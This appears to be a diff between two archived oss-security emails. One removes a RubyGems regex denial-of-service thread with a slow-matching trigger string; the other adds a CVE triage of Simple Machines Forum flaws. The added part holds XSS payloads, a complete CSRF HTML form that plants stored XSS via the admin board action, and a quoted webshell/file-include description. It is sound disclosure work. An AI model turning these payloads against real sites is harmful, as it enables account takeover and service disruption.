@@ -1,71 +1,84 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/09/18/10
-Message-ID: <523A2397.2010200@mccme.ru>
-Date: Thu, 19 Sep 2013 02:05:11 +0400
-From: Alexander Cherepanov <cherepan@...me.ru>
-To: oss-security@...ts.openwall.com
-CC: Eric Hodel <drbrain@...ment7.net>, kseifried@...hat.com,  "dammer2k@...il.com Sharipov" <dammer2k@...il.com>, "security@...y-lang.org" <security@...y-lang.org>
-Subject: Re: CVE-2013-4287 Algorithmic complexity vulnerability in RubyGems 2.0.7 and older
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/09/24/2
+Message-ID: <20130924161735.GA25117@kludge.henri.nerv.fi>
+Date: Tue, 24 Sep 2013 19:17:35 +0300
+From: Henri Salo <henri@...v.fi>
+To: oss-security@...ts.openwall.com, kseifried@...hat.com
+Cc: Moritz Naumann <security@...itz-naumann.com>, security@...plemachines.org
+Subject: Re: CVE request: Simple Machines Forum (SMF) <= 2.0.5 - multiple vulnerabilities
 Content-Type: text/plain; charset=utf-8
 
-On 2013-09-18 04:11, Eric Hodel wrote:
-> On Sep 16, 2013, at 18:28, Kurt Seifried <kseifried@...hat.com> wrote:
->> On 09/14/2013 03:11 PM, Alexander Cherepanov wrote:
->>> On 2013-09-10 09:32, Eric Hodel wrote:
->>>> The vulnerability can be fixed by changing the first grouping to
->>>> an atomic grouping in Gem::Version::VERSION_PATTERN in
->>>> lib/rubygems/version.rb.  For RubyGems 2.0.x:
->>>>
->>>> -  VERSION_PATTERN =
->>>> '[0-9]+(\.[0-9a-zA-Z]+)*(-[0-9A-Za-z-]+(\.[0-9A-Za-z-]+)*)?' #
->>>> :nodoc: +  VERSION_PATTERN =
->>>> '[0-9]+(?>\.[0-9a-zA-Z]+)*(-[0-9A-Za-z-]+(\.[0-9A-Za-z-]+)*)?' #
->>>> :nodoc:
->>>>
->>>> For RubyGems 1.8.x:
->>>>
->>>> -  VERSION_PATTERN = '[0-9]+(\.[0-9a-zA-Z]+)*' # :nodoc: +
->>>> VERSION_PATTERN = '[0-9]+(?>\.[0-9a-zA-Z]+)*' # :nodoc:
->>>
->>> This is not enough. The following script:
->>>
->>> # Regexes are from 
->>> https://github.com/rubygems/rubygems/blob/master/lib/rubygems/version.rb#L150
->>>
->>>
->> VERSION_PATTERN =
->>> '[0-9]+(?>\.[0-9a-zA-Z]+)*(-[0-9A-Za-z-]+(\.[0-9A-Za-z-]+)*)?' #
->>> :nodoc: ANCHORED_VERSION_PATTERN =
->>> /\A\s*(#{VERSION_PATTERN})*\s*\z/ # :nodoc: 
->>> '1111111111111111111111111111.' =~ ANCHORED_VERSION_PATTERN
->>>
->>> takes ~1m on my machine. The problem is not in VERSION_PATTERN but
->>> in its possible repetition inside ANCHORED_VERSION_PATTERN.
->>>
->>
->> Great, I guess we're going to need a new CVE. Before I assign one can
->> we make sure we fix this so more fiddly expressions don't cause
->> problems? Thanks.
-> 
-> Here's a new patch to go with the new (unassigned) CVE.  This new patch replaces regular expression matches that are susceptible to backtracking with a parser-like approach.
+On Mon, Sep 16, 2013 at 07:23:52PM -0600, Kurt Seifried wrote:
+> Can you provide a summary of the diff? thanks.
 
-According to your patch 'versions have only one "-" (per semver)'. This
-means that "*" after "(#{VERSION_PATTERN})" in ANCHORED_VERSION_PATTERN
-is a bug. It should be "?". If you fix it then there should be no
-problem with VERSION_PATTERN at all. AFAICT VERSION_PATTERN gives you a
-linear complexity. Hence there is no need to suppress backtracking...
+Upstream is CCd so they can and should reply in case I made errors in this email.
 
-> This patch applies to RubyGems 2.1.x releases.  I will create patches for RubyGems 1.8.23.1, 1.8.26, 2.0.9 and 2.1.4 if it there is no obvious flaw seen in it.
-> 
-> I would like to release this fix by Monday, 23 September as I will be traveling mid-week.
-> 
-> The vulnerable regular expression constants are still present, but I can't think of a way to construct them that does not allow backtracking.
+Could not reproduce this issue:
+http://packetstormsecurity.com/files/121391/public_phpInjection-smf204.txt
 
-...but if you really want to suppress backtracking (say, for
-optimization) it is easy: either atomic grouping for every repetition
-(exactly the way you have already done but for other repetitions also)
-or add extra "+" after each "+" and "*". That's according to
-http://www.ruby-doc.org/core-2.0.0/Regexp.html .
+Multiple XSS issues in fixed in ./Sources/ManageServer.php by changing
+addslashes to preg_replace. I don't know who reported these or if these fixes
+are related to vulnerabilities listed below.
 
--- 
-Alexander Cherepanov
+From http://hauntit.blogspot.co.uk/2013/04/en-smf-204-full-disclosure.html
+
+"""
+First of all, let's check a local file include vulnerability. If admin will not
+delete the install.php file after installation, attacker is able to run command
+and compromise the server. Idea is simple. User who is able to put php-file
+(with webshell) at SMF-installed-server, can exploit a require_once() function
+to get a shell at remote host.
+"""
+
+No CVE as per installation requests user to delete install.php and offers easy
+way to do it in the installation process. Please comment if you feel otherwise.
+Did not try to reproduce this issue. Probably not the only issue if user does
+not delete install.php file.
+
+XSS in index.php?action=admin;area=manageboards;sa=newboard;cat=1 "board_name"
+Requires admin account
+PoC: "><BODY ONLOAD=alert('XSS')>
+Verified in 2.0.4
+Not fixed in 2.0.5
+
+SMF guys, this CSRF should help to verify this issue. Can you fix this in next
+release? Contact me in case you need help.
+
+<html>
+  <body>
+    <form action="http://example.com/index.php?action=admin;area=manageboards;sa=board2" method="POST">
+      <input type="hidden" name="boardid" value="0" />
+      <input type="hidden" name="new&#95;cat" value="0" />
+      <input type="hidden" name="placement" value="after" />
+      <input type="hidden" name="board&#95;order" value="1" />
+      <input type="hidden" name="board&#95;name" value="New&#32;Board" />
+      <input type="hidden" name="desc" value="&quot;&gt;&lt;BODY&#32;ONLOAD&#61;alert&#40;&apos;XSS&apos;&#41;&gt;" />
+      <input type="hidden" name="profile" value="1" />
+      <input type="hidden" name="groups&#91;&#93;" value="&#45;1" />
+      <input type="hidden" name="groups&#91;&#93;" value="0" />
+      <input type="hidden" name="groups&#91;&#93;" value="2" />
+      <input type="hidden" name="dummy&#95;834674" value="" />
+      <input type="hidden" name="redirect&#95;address" value="" />
+      <input type="hidden" name="count" value="on" />
+      <input type="hidden" name="boardtheme" value="0" />
+      <input type="hidden" name="rid" value="boards" />
+      <input type="hidden" name="e2b8c5b3437" value="bdcc798a0a86fa141da538f7c3a6ec42" />
+      <input type="hidden" name="no&#95;children" value="1" />
+      <input type="hidden" name="cur&#95;cat" value="1" />
+      <input type="hidden" name="add" value="Add&#32;Board" />
+      <input type="hidden" name="moderators" value="" />
+      <input type="submit" value="Submit form" />
+    </form>
+  </body>
+</html>
+
+XSS in index.php?action=pm;sa=settings;save "sa"
+Requires registed user account
+POST PoC: "><img/src="x"/onerror="alert(123)"><
+Verified in 2.0.4
+Fixed in 2.0.5
+
+---
+Henri Salo
+
+Download attachment "signature.asc" of type "application/pgp-signature" (199 bytes)
